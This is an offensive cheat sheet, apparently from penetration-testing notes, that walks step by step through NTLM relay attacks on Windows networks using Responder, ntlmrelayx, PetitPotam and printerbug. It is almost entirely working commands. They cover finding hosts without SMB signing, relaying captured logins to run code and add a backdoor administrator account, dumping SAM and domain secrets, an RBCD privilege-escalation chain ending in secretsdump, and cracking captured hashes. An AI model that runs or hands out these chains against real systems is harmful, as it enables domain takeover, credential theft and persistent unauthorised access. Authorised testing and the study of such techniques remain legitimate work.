# Responder — NTLM Relay Reference

## Concept

Hash cracking is offline and slow. NTLM relay forwards the auth challenge directly to a target service — no cracking needed. If the captured user has local admin on the relay target, you get code execution.

**Requirements:**
- SMB signing disabled on target (check with `nxc smb <range> --gen-relay-list`)
- Captured user has local admin rights on relay target
- Responder SMB + HTTP must be OFF (so victim connects to ntlmrelayx instead)

## Step 1 — Find Targets Without SMB Signing

```bash
# netexec (nxc / crackmapexec)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# saves IPs where signing=False to relay_targets.txt

# or nmap
nmap --script smb2-security-mode -p 445 192.168.1.0/24
# look for: "Message signing enabled but not required"
```

## Step 2 — Configure Responder (Disable SMB + HTTP)

```ini
# /etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

```bash
sudo responder -I eth0 -wdv
```

## Step 3 — Start ntlmrelayx

```bash
# Relay to SMB → execute command
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# Relay to SMB → dump SAM hashes (default)
ntlmrelayx.py -tf relay_targets.txt -smb2support

# Interactive SMB shell (smbclient-like)
ntlmrelayx.py -tf relay_targets.txt -smb2support -i
# Then: nc 127.0.0.1 <port>

# Relay to LDAP → dump domain info
ntlmrelayx.py -t ldap://<dc_ip> -smb2support --dump-laps --dump-adcs

# Relay to LDAPS → RBCD attack (add computer account, get silver ticket)
ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --escalate-user <user>
```

## Step 4 — Trigger Auth

Wait passively for Windows hosts to broadcast LLMNR/NBT-NS, or force it:

```bash
# Force authentication via UNC path injection (if you have code execution)
# Windows target runs: net use \\<attacker_ip>\share

# Via PetitPotam (unauthenticated, forces DC to auth)
python3 PetitPotam.py -u '' -p '' <attacker_ip> <dc_ip>

# Via PrintSpooler (authenticated)
python3 printerbug.py domain/user:pass@<target> <attacker_ip>
```

## LDAP Relay → Resource-Based Constrained Delegation (RBCD)

Full chain for domain privilege escalation:

```bash
# Step 1: Relay to LDAPS with delegate-access
ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access

# Step 2: When triggered, ntlmrelayx creates a machine account (e.g. EVILCOMPUTER$)
# and sets msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer

# Step 3: Request S4U2self + S4U2proxy TGS as Administrator
getST.py -spn cifs/<target_hostname> -impersonate Administrator domain/EVILCOMPUTER$:<password> -dc-ip <dc_ip>

# Step 4: Use the TGS
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <target_hostname>
```

## Cross-Protocol Relay

```bash
# SMB → HTTP (WebDAV) relay
ntlmrelayx.py -t http://<target>/wpad.dat -smb2support

# SMB → MSSQL
ntlmrelayx.py -t mssql://<target> -smb2support -q "SELECT name FROM sys.databases"

# HTTP → SMB (capture from browser, relay to SMB)
ntlmrelayx.py -tf relay_targets.txt -smb2support
# Then redirect browser to attacker via XSS or BeEF
```

## MultiRelay (Responder built-in, legacy)

```bash
# Only use if ntlmrelayx unavailable
python3 /usr/share/responder/tools/MultiRelay.py -t <target_ip> -u ALL
```

## Hash Log Locations

```
/usr/share/responder/logs/SMB-NTLMv2-SSP-<date>.txt
/usr/share/responder/logs/HTTP-NTLMv2-<date>.txt
~/.responder/logs/  (alternative path)
```

## Quick Crack After Capture

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt | sort -u > hashes.txt
hashcat -a 0 -m 5600 hashes.txt rockyou.txt -r best64.rule
```
